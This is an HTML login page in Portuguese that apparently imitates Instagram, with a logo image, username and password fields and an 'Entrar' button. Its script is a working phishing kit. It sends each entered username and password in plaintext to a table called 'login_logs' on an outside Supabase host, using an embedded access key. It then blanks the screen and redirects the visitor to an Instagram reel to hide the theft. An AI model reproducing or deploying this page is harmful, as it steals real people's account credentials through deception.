<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>• Login</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      margin: 0;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 350px;
      padding: 40px 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo img {
      max-width: 180px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #4cb5f9;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="logo">
      <img src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png">
    </div>

    <input id="usuario" placeholder="Usuário">
    <input id="senha" placeholder="Senha">

    <button onclick="enviar()">Entrar</button>
  </div>

  <div id="whiteScreen" style="
    display:none;
    position:fixed;
    inset:0;
    background:#fff;
    z-index:9999;"></div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const supabaseClient = supabase.createClient(
      "https://pwmtpvsgykjvouljjmrz.supabase.co",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8"
    );

    async function enviar() {
      const usuario = document.getElementById("usuario").value;
      const senha = document.getElementById("senha").value;

      const { error } = await supabaseClient
        .from("login_logs")
        .insert({
          usuario: usuario,
          senha: senha
        });

      if (error) {
        alert("Erro: " + error.message);
        return;
      }

      document.getElementById("whiteScreen").style.display = "block";
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/reels/DSYPgN7EVG3/";
      }, 150);
    }
  </script>
</body>
</html>
